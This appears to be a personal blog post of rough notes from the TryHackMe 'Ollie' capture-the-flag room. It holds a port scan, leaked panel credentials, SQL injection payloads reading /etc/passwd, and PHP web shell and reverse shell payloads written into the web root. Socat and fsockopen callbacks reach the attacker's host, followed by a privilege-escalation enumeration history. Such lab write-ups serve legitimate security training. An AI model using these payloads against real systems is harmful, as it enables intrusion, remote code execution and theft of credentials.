---
layout: post
title: 'Ollie - {THM} Room'
description: 'Ollie THM writeup (just notes, actual writeup coming soon!)'
permalink: /blog/thm-ollie/
published: true
categories:
  - thm
  - ctf
  - ollie
  - hacking
  - linux

---
<p>Ollie scratch doc content (to clean up) - making a change from editor :)</p>
<div style="color: #c5c8c6; background-color: #1e1e1e; font-family: 'Droid Sans Mono', 'monospace', monospace; font-size: 12px; line-height: 16px;">
<div>VMIP: 10.10.163.9</div>
<br />
<div>http://10.10.163.9/index.php<span style="color: #676867;">?</span>page=login</div>
<br />
<div>db_nmap -v -A -p1000-10000 10.10.163.9</div>
<div>[<span style="color: #676867;">*</span>] Nmap: Starting Nmap 7.60 ( https://nmap.org ) at 2022-04-09 04:51 BST</div>
<div>[<span style="color: #676867;">*</span>] Nmap: NSE: Loaded 146 scripts <span style="color: #9872a2;">for</span> scanning.</div>
<div>[<span style="color: #676867;">*</span>] Nmap: NSE: Script Pre-scanning.</div>
<div>[<span style="color: #676867;">*</span>] Nmap: Initiating NSE at 04:51</div>
<div>[<span style="color: #676867;">*</span>] Nmap: Completed NSE at 04:51, 0.00s elapsed</div>
<div>[<span style="color: #676867;">*</span>] Nmap: Initiating NSE at 04:51</div>
<div>[<span style="color: #676867;">*</span>] Nmap: Completed NSE at 04:51, 0.00s elapsed</div>
<div>[<span style="color: #676867;">*</span>] Nmap: Initiating ARP Ping Scan at 04:51</div>
<div>[<span style="color: #676867;">*</span>] Nmap: Scanning 10.10.163.9 [1 port]</div>
<div>[<span style="color: #676867;">*</span>] Nmap: Completed ARP Ping Scan at 04:51, 0.22s elapsed (1 total hosts)</div>
<div>[<span style="color: #676867;">*</span>] Nmap: Initiating Parallel DNS resolution of 1 host. at 04:51</div>
<div>[<span style="color: #676867;">*</span>] Nmap: Completed Parallel DNS resolution of 1 host. at 04:51, 0.00s elapsed</div>
<div>[<span style="color: #676867;">*</span>] Nmap: Initiating SYN Stealth Scan at 04:51</div>
<div>[<span style="color: #676867;">*</span>] Nmap: Scanning ip-10-10-163-9.eu-west-1.compute.internal (10.10.163.9) [9001 ports]</div>
<div>[<span style="color: #676867;">*</span>] Nmap: Discovered open port 1337/tcp on 10.10.163.9</div>
<br />
<div>root@ip-10-10-192-160:<span style="color: #676867;">~</span><span style="color: #9a9b99;"># nc 10.10.163.9 1337</span></div>
<div>Hey stranger, I<span style="color: #9aa83a;">'m Ollie, protector of panels, lover of deer antlers.</span></div>
<br />
<div><span style="color: #9aa83a;">What is your name? admin</span></div>
<div><span style="color: #9aa83a;">What'</span>s up, Admin<span style="color: #676867;">!</span> It<span style="color: #9aa83a;">'s been a while. What are you here for? password</span></div>
<div><span style="color: #9aa83a;">Ya'</span> know what<span style="color: #676867;">?</span> Admin. If you can answer a question about me, I might have something <span style="color: #9872a2;">for</span> you.</div>
<br /><br />
<div>What breed of dog am I<span style="color: #676867;">?</span> I<span style="color: #9aa83a;">'ll make it a multiple choice question to keep it easy: Bulldog, Husky, Duck or Wolf? Bulldog</span></div>
<div><span style="color: #9aa83a;">You are correct! Let me confer with my trusted colleagues; Benny, Baxter and Connie...</span></div>
<div><span style="color: #9aa83a;">Please hold on a minute</span></div>
<div><span style="color: #9aa83a;">Ok, I'</span>m back.</div>
<div>After a lengthy discussion, we<span style="color: #9aa83a;">'ve come to the conclusion that you are the right person for the job.Here are the credentials for our administration panel.</span></div>
<br />
<div><span style="color: #9aa83a;"> Username: admin</span></div>
<br />
<div><span style="color: #9aa83a;"> Password: OllieUnixMontgomery!</span></div>
<br />
<div><span style="color: #9aa83a;">PS: Good luck and next time bring some treats!</span></div>
<br />
<div><span style="color: #9aa83a;">thanks! bringing treats, piles of treats you magnificent bastard!</span></div>
<br />
<div><span style="color: #9aa83a;">https://fluidattacks.com/advisories/mercury/</span></div>
<br />
<div><span style="color: #9aa83a;">Input (filter SQLi):</span></div>
<div><span style="color: #9aa83a;">" union select 1,1,user(),1 -- -</span></div>
<br />
<div><span style="color: #9aa83a;"> 1/phpipam_ollie@localhost (1)</span></div>
<br /><br /><br />
<div><span style="color: #9aa83a;">" union select user(),1,1,load_file('</span>/etc/passwd<span style="color: #9aa83a;">') -- -</span></div>
<div><span style="color: #9aa83a;"> phpipam_ollie@localhost/1 (root:x:0:0:root:/root:/bin/bash</span></div>
<div><span style="color: #9aa83a;"> daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span></div>
<div><span style="color: #9aa83a;"> bin:x:2:2:bin:/bin:/usr/sbin/nologin</span></div>
<div><span style="color: #9aa83a;"> sys:x:3:3:sys:/dev:/usr/sbin/nologin</span></div>
<div><span style="color: #9aa83a;"> sync:x:4:65534:sync:/bin:/bin/sync</span></div>
<div><span style="color: #9aa83a;"> games:x:5:60:games:/usr/games:/usr/sbin/nologin</span></div>
<div><span style="color: #9aa83a;"> man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span></div>
<div><span style="color: #9aa83a;"> lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span></div>
<div><span style="color: #9aa83a;"> mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span></div>
<div><span style="color: #9aa83a;"> news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span></div>
<div><span style="color: #9aa83a;"> uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span></div>
<div><span style="color: #9aa83a;"> proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span></div>
<div><span style="color: #9aa83a;"> www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span></div>
<div><span style="color: #9aa83a;"> backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span></div>
<div><span style="color: #9aa83a;"> list:x:38:38:Mailing</span></div>
<div><span style="color: #9aa83a;"> List</span></div>
<div><span style="color: #9aa83a;"> Manager:/var/list:/usr/sbin/nologin</span></div>
<div><span style="color: #9aa83a;"> irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span></div>
<div><span style="color: #9aa83a;"> gnats:x:41:41:Gnats</span></div>
<div><span style="color: #9aa83a;"> Bug-Reporting</span></div>
<div><span style="color: #9aa83a;"> System</span></div>
<div><span style="color: #9aa83a;"> (admin):/var/lib/gnats:/usr/sbin/nologin</span></div>
<div><span style="color: #9aa83a;"> nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span></div>
<div><span style="color: #9aa83a;"> systemd-network:x:100:102:systemd</span></div>
<div><span style="color: #9aa83a;"> Network</span></div>
<div><span style="color: #9aa83a;"> Management,,,:/run/systemd:/usr/sbin/nologin</span></div>
<div><span style="color: #9aa83a;"> systemd-resolve:x:101:103:systemd</span></div>
<div><span style="color: #9aa83a;"> Resolver,,,:/run/systemd:/usr/sbin/nologin</span></div>
<div><span style="color: #9aa83a;"> systemd-timesync:x:102:104:systemd</span></div>
<div><span style="color: #9aa83a;"> Time</span></div>
<div><span style="color: #9aa83a;"> Synchronization,,,:/run/systemd:/usr/sbin/nologin</span></div>
<div><span style="color: #9aa83a;"> messagebus:x:103:106::/nonexistent:/usr/sbin/nologin</span></div>
<div><span style="color: #9aa83a;"> syslog:x:104:110::/home/syslog:/usr/sbin/nologin</span></div>
<div><span style="color: #9aa83a;"> _apt:x:105:65534::/nonexistent:/usr/sbin/nologin</span></div>
<div><span style="color: #9aa83a;"> tss:x:106:111:TPM</span></div>
<div><span style="color: #9aa83a;"> software</span></div>
<div><span style="color: #9aa83a;"> stack,,,:/var/lib/tpm:/bin/false</span></div>
<div><span style="color: #9aa83a;"> uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin</span></div>
<div><span style="color: #9aa83a;"> tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin</span></div>
<div><span style="color: #9aa83a;"> landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin</span></div>
<div><span style="color: #9aa83a;"> pollinate:x:110:1::/var/cache/pollinate:/bin/false</span></div>
<div><span style="color: #9aa83a;"> usbmux:x:111:46:usbmux</span></div>
<div><span style="color: #9aa83a;"> daemon,,,:/var/lib/usbmux:/usr/sbin/nologin</span></div>
<div><span style="color: #9aa83a;"> sshd:x:112:65534::/run/sshd:/usr/sbin/nologin</span></div>
<div><span style="color: #9aa83a;"> systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin</span></div>
<div><span style="color: #9aa83a;"> ollie:x:1000:1000:ollie</span></div>
<div><span style="color: #9aa83a;"> unix</span></div>
<div><span style="color: #9aa83a;"> montgomery:/home/ollie:/bin/bash</span></div>
<div><span style="color: #9aa83a;"> lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false</span></div>
<div><span style="color: #9aa83a;"> mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false dnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin )</span></div>
<br />
<div><span style="color: #9aa83a;">" union select user(),1,1,load_file('</span>/etc/group<span style="color: #9aa83a;">') -- -</span></div>
<div><span style="color: #9aa83a;">phpipam_ollie@localhost/1 (root:x:0: daemon:x:1: bin:x:2: sys:x:3: adm:x:4:syslog,ollie tty:x:5:syslog disk:x:6: lp:x:7: mail:x:8: news:x:9: uucp:x:10: man:x:12: proxy:x:13: kmem:x:15: dialout:x:20: fax:x:21: voice:x:22: cdrom:x:24:ollie floppy:x:25: tape:x:26: sudo:x:27: audio:x:29: dip:x:30:ollie www-data:x:33: backup:x:34: operator:x:37: list:x:38: irc:x:39: src:x:40: gnats:x:41: shadow:x:42: utmp:x:43: video:x:44: sasl:x:45: plugdev:x:46:ollie staff:x:50: games:x:60: users:x:100: nogroup:x:65534: systemd-journal:x:101: systemd-network:x:102: systemd-resolve:x:103: systemd-timesync:x:104: crontab:x:105: messagebus:x:106: input:x:107: kvm:x:108: render:x:109: syslog:x:110: tss:x:111: uuidd:x:112: tcpdump:x:113: ssh:x:114: landscape:x:115: lxd:x:116: systemd-coredump:x:999: ollie:x:1000: ssl-cert:x:117: mysql:x:118: docker:x:119: )</span></div>
<br />
<div><span style="color: #9aa83a;">" union select 1,'','','' into outfile '</span>/var/www/html/test.php<span style="color: #9aa83a;">' -- -</span></div>
<div><span style="color: #9aa83a;">" union select 1,2,3,'</span><span style="color: #676867;">&lt;?</span>php system(<span style="color: #6089b4;">$_GET</span>[<span style="color: #9aa83a;">"cmd"</span>])<span style="color: #676867;">;</span> <span style="color: #676867;">?&gt;</span><span style="color: #9aa83a;">' into outfile '</span>/var/www/html/cmd.php<span style="color: #9aa83a;">' -- -</span></div>
<div><span style="color: #9aa83a;">http://10.10.163.9/cmd.php?cmd=whoami</span></div>
<div><span style="color: #9aa83a;">1 2 3 www-data</span></div>
<br />
<div><span style="color: #9aa83a;">http://10.10.163.9/cmd.php?cmd=uname%20-a</span></div>
<div><span style="color: #9aa83a;">1 2 3 Linux hackerdog 5.4.0-99-generic #112-Ubuntu SMP Thu Feb 3 13:50:55 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux </span></div>
<br />
<div><span style="color: #9aa83a;">http://10.10.163.9/cmd.php?cmd=ls%20-al%20/home/ollie/</span></div>
<div><span style="color: #9aa83a;">1 2 3 </span></div>
<div><span style="color: #9aa83a;">total 36 </span></div>
<div><span style="color: #9aa83a;">drwxr-xr-x 5 ollie ollie 4096 Feb 10 03:22 . </span></div>
<div><span style="color: #9aa83a;">drwxr-xr-x 3 root root 4096 Feb 6 15:17 .. </span></div>
<div><span style="color: #9aa83a;">lrwxrwxrwx 1 root root 9 Feb 6 15:29 .bash_history -&gt; /dev/null </span></div>
<div><span style="color: #9aa83a;">-rw-r--r-- 1 ollie ollie 220 Feb 25 2020 .bash_logout </span></div>
<div><span style="color: #9aa83a;">-rw-r--r-- 1 ollie ollie 3771 Feb 25 2020 .bashrc </span></div>
<div><span style="color: #9aa83a;">drwx------ 2 ollie ollie 4096 Feb 6 15:19 .cache </span></div>
<div><span style="color: #9aa83a;">drwxrwxr-x 3 ollie ollie 4096 Feb 6 15:46 .config </span></div>
<div><span style="color: #9aa83a;">drwxrwxr-x 3 ollie ollie 4096 Feb 6 15:20 .local </span></div>
<div><span style="color: #9aa83a;">-rw-r--r-- 1 ollie ollie 807 Feb 25 2020 .profile </span></div>
<div><span style="color: #9aa83a;">-rw-r--r-- 1 ollie ollie 0 Feb 10 03:21 .sudo_as_admin_successful </span></div>
<div><span style="color: #9aa83a;">-r-x------ 1 ollie ollie 29 Feb 10 03:22 user.txt </span></div>
<br />
<div><span style="color: #9aa83a;">" union select 1,'','','' into outfile '</span>/var/www/html/test.php<span style="color: #9aa83a;">' -- -</span></div>
<div><span style="color: #9aa83a;">" union select 1,2,3,'</span><span style="color: #676867;">&lt;?</span>php <span style="color: #6089b4;">$sock</span>=fsockopen(<span style="color: #9aa83a;">"10.6.18.225"</span>,1337)<span style="color: #676867;">;</span>exec(<span style="color: #9aa83a;">"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3"</span>)<span style="color: #676867;">;</span> <span style="color: #676867;">?&gt;</span><span style="color: #9aa83a;">' into outfile '</span>/var/www/html/sh.php<span style="color: #9aa83a;">' -- -</span></div>
<br /><br />
<div><span style="color: #9aa83a;">socat file:`tty`,raw,echo=0 TCP-L:4242</span></div>
<div><span style="color: #9aa83a;">http://10.10.163.9/cmd.php?cmd=socat%20exec:%27bash%20-li%27,pty,stderr,setsid,sigint,sane%20tcp:10.6.18.225:4242</span></div>
<br /><br />
<div><span style="color: #9aa83a;">su - ollie (same password :P)</span></div>
<br />
<div><span style="color: #9aa83a;">cat user.txt</span></div>
<div><span style="color: #9aa83a;">THM{*********}</span></div>
<br /><br />
<div><span style="color: #9aa83a;">ollie@hackerdog:/etc$ find / -perm -u=s -type f 2&gt;/dev/null | rev | cut -d'</span>/<span style="color: #9aa83a;">' -f 1 | rev | sort | uniq</span></div>
<div><span style="color: #9aa83a;">at</span></div>
<div><span style="color: #9aa83a;">chfn</span></div>
<div><span style="color: #9aa83a;">chsh</span></div>
<div><span style="color: #9aa83a;">dbus-daemon-launch-helper</span></div>
<div><span style="color: #9aa83a;">dmcrypt-get-device</span></div>
<div><span style="color: #9aa83a;">fusermount</span></div>
<div><span style="color: #9aa83a;">gpasswd</span></div>
<div><span style="color: #9aa83a;">mount</span></div>
<div><span style="color: #9aa83a;">newgrp</span></div>
<div><span style="color: #9aa83a;">passwd</span></div>
<div><span style="color: #9aa83a;">ping</span></div>
<div><span style="color: #9aa83a;">pkexec</span></div>
<div><span style="color: #9aa83a;">polkit-agent-helper-1</span></div>
<div><span style="color: #9aa83a;">snap-confine</span></div>
<div><span style="color: #9aa83a;">ssh-keysign</span></div>
<div><span style="color: #9aa83a;">su</span></div>
<div><span style="color: #9aa83a;">sudo</span></div>
<div><span style="color: #9aa83a;">umount</span></div>
<br />
<div><span style="color: #9aa83a;">ollie@hackerdog:/etc$ cat /etc/crontab</span></div>
<div><span style="color: #9aa83a;"># /etc/crontab: system-wide crontab</span></div>
<div><span style="color: #9aa83a;"># Unlike any other crontab you don'</span>t have to run the <span style="color: #9aa83a;">`crontab'</span></div>
<div><span style="color: #9aa83a;"># command to install the new version when you edit this file</span></div>
<div><span style="color: #9aa83a;"># and files in /etc/cron.d. These files also have username fields,</span></div>
<div><span style="color: #9aa83a;"># that none of the other crontabs do.</span></div>
<br />
<div><span style="color: #9aa83a;">SHELL=/bin/sh</span></div>
<div><span style="color: #9aa83a;">PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</span></div>
<br />
<div><span style="color: #9aa83a;"># Example of job definition:</span></div>
<div><span style="color: #9aa83a;"># .---------------- minute (0 - 59)</span></div>
<div><span style="color: #9aa83a;"># | .------------- hour (0 - 23)</span></div>
<div><span style="color: #9aa83a;"># | | .---------- day of month (1 - 31)</span></div>
<div><span style="color: #9aa83a;"># | | | .------- month (1 - 12) OR jan,feb,mar,apr ...</span></div>
<div><span style="color: #9aa83a;"># | | | | .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span></div>
<div><span style="color: #9aa83a;"># | | | | |</span></div>
<div><span style="color: #9aa83a;"># * * * * * user-name command to be executed</span></div>
<div><span style="color: #9aa83a;">17 * * * * root cd / &amp;&amp; run-parts --report /etc/cron.hourly</span></div>
<div><span style="color: #9aa83a;">25 6 * * * root test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )</span></div>
<div><span style="color: #9aa83a;">47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )</span></div>
<div><span style="color: #9aa83a;">52 6 1 * * root test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )</span></div>
<br /><br />
<div><span style="color: #9aa83a;">ollie@hackerdog:/etc/cron.d$ cat /etc/passwd | cut -d: -f1 # List of users</span></div>
<div><span style="color: #9aa83a;">root</span></div>
<div><span style="color: #9aa83a;">daemon</span></div>
<div><span style="color: #9aa83a;">bin</span></div>
<div><span style="color: #9aa83a;">sys</span></div>
<div><span style="color: #9aa83a;">sync</span></div>
<div><span style="color: #9aa83a;">games</span></div>
<div><span style="color: #9aa83a;">man</span></div>
<div><span style="color: #9aa83a;">lp</span></div>
<div><span style="color: #9aa83a;">mail</span></div>
<div><span style="color: #9aa83a;">news</span></div>
<div><span style="color: #9aa83a;">uucp</span></div>
<div><span style="color: #9aa83a;">proxy</span></div>
<div><span style="color: #9aa83a;">www-data</span></div>
<div><span style="color: #9aa83a;">backup</span></div>
<div><span style="color: #9aa83a;">list</span></div>
<div><span style="color: #9aa83a;">irc</span></div>
<div><span style="color: #9aa83a;">gnats</span></div>
<div><span style="color: #9aa83a;">nobody</span></div>
<div><span style="color: #9aa83a;">systemd-network</span></div>
<div><span style="color: #9aa83a;">systemd-resolve</span></div>
<div><span style="color: #9aa83a;">systemd-timesync</span></div>
<div><span style="color: #9aa83a;">messagebus</span></div>
<div><span style="color: #9aa83a;">syslog</span></div>
<div><span style="color: #9aa83a;">_apt</span></div>
<div><span style="color: #9aa83a;">tss</span></div>
<div><span style="color: #9aa83a;">uuidd</span></div>
<div><span style="color: #9aa83a;">tcpdump</span></div>
<div><span style="color: #9aa83a;">landscape</span></div>
<div><span style="color: #9aa83a;">pollinate</span></div>
<div><span style="color: #9aa83a;">usbmux</span></div>
<div><span style="color: #9aa83a;">sshd</span></div>
<div><span style="color: #9aa83a;">systemd-coredump</span></div>
<div><span style="color: #9aa83a;">ollie</span></div>
<div><span style="color: #9aa83a;">lxd</span></div>
<div><span style="color: #9aa83a;">mysql</span></div>
<div><span style="color: #9aa83a;">dnsmasq</span></div>
</div>
<p>&nbsp;</p>
<p>User history</p>
<pre>ollie@hackerdog:/etc$ history
    1  sudo apt update
    2  cat /etc/fstab
    3  ls
    4  history
    5  ls -al
    6  cd /etc
    7  ls -al
    8  ps axjf
    9  cat /usr/share/unattended-upgrades/unattended-upgrade-shutdown
   10  ps aux
   11  docker
   12  which docker
   13  docker ps
   14  find / -perm -u=s -type f 2&gt;/dev/null
   15  cat /etc/profile
   16  cat /etc/bash.bashrc 
   17  cat /etc/bash.bashrc  | grep -i path
   18  cat /etc/* | grep -i path
   19  cat /etc/* | grep -i path 2&gt;/dev/null
   20  find / -writable 2&gt;/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
   21  cd /usr/bin
   22  ls -al
   23  echo $PATH
   24  cd /usr/games
   25  ls -al
   26  touch test
   27  cd ../local/sbin
   28  touch po
   29  cd /tmp
   30  ls
   31  cat poop
   32  cat test.php 
   33  ls -al
   34  ls -al | grep mysql
   35  cd ~
   36  ls
   37  ls -al
   38  cd /etc
   39  ls -al
   40  find / -perm -u=s -type f 2&gt;/dev/null
   41  which update-alternatives
   42  find / -perm -u=s -type f 2&gt;/dev/null | rev | cut -d'/' -f 1 | rev | uniq
   43  find / -perm -u=s -type f 2&gt;/dev/null | rev | cut -d'/' -f 1 | sort | uniq
   44  find / -perm -u=s -type f 2&gt;/dev/null | rev | cut -d'/' -f 1 | rev | sort | uniq
   45  getcap -r / 2&gt;/dev/null
   46  cat /etc/crontab
   47  which run-parts
   48  vim /usr/bin/run
   49  vim /usr/bin/run-parts
   50  sudo -l
   51  uname -a
   52  cat /etc/profile
   53  cat /etc/bashrc
   54  env
   55  cat /proc/version
   56  uname -mrs
   57  ls -aRl /etc/ | awk '$1 ~ /^.*r.*/
   58  ls -aRl /etc/ | awk '$1 ~ /^.*r.*/'
   59  crontab -l
   60  cat /etc/anacrontab
   61  cat /etc/crontab
   62  cd /etc/cron
   63  ls
   64  cd /etc/cron.hourly/
   65  ls
   66  cd ../cron.d
   67  ls
   68  ls -al
   69  cat popularity-contest 
   70  cat *
   71  ls -al /usr/lib/php/sessionclean
   72  ls -al /sbin/e2scrub_all
   73  ls -al /run/systemd/system
   74  ls -al /usr/lib/x86_64-linux-gnu/e2fsprogs/e2scrub_all_cron
   75  grep -RHin "exec" .
   76  grep -RHin "conf" .
   77  cat /etc/cron.daily/popularity-contest
   78  ls -al /etc/cron.daily/popularity-contest
   79  popularity-contest
   80  cd ~
   81  cd /etc/cron.d
   82  ls
   83  cat e2scrub_all 
   84  cat php
   85  cat popularity-contest 
   86  cd /usr/lib/php
   87  ls -al
   88  cd /etc/cron.d
   89  ls
   90  cat popularity-contest 
   91  cat /etc/crontab 
   92  anacron -h
   93  test -x /usr/sbin/anacron
   94  echo $?
   95  echo "poo" &gt; /usr/sbin/anacron
   96  grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2&gt; /dev/null
   97  snap --version
   98  cat /etc/security/opasswd
   99  strings /dev/mem -n10 | grep -i PASS
  100  locate password
  101  find / -type f -name *password*
  102  find / -type f -name *password* 2&gt;/dev/null
  103  cat /etc/pam.d/common-password
  104  cat /var/cache/debconf/passwords.dat
  105  ifconfig
  106  cat /etc/resolv.conf
  107  lsof -i
  108  cat /etc/passwd | cut -d: -f1    # List of users
  109  grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'   # List of super users
  110  awk -F: '($3 == "0") {print}' /etc/passwd   # List of super users
  111  cat /etc/sudoers
  112  ls -alh /var/mail/
  113  ls -ahlR /root/
  114  vim /root/.ssh/authorized_keys
  115  ls -alhR /var/www/html/
  116  df -h
  117  mount
  118  history
  119  grep --color=auto -rnw '/' -ie "root_squash" --color=always 2&gt;/dev/null
  120  echo "PubkeyAcceptedKeyTypes=+ssh-dss" &gt;&gt; /etc/ssh/sshd_config
  121  getcap -r  /usr/bin
  122  find / -writable ! -user `whoami` -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2&gt;/dev/null
  123  vim $(which feedme)
  124  which feedme
  125  cat /usr/bin/feedme
  126  vim /usr/bin/feedme
  127  feedme
  128  cd /
  129  grep -Rn feedme .
  130  chmod +x /usr/bin/feedme
  131  cd /usr/bin
  132  ls -al | grep olli
  133  cd /etc/
  134  grep -RHn "feedme" . 2&gt;/dev/null
  135  service feedme status
  136  vim /usr/bin/feedme
  137  service feedme status
  138  service feedme restart
  139  feedme
  140  service feedme restart
  141  service feedme status
  142  history
</pre>
<p>&nbsp;</p>
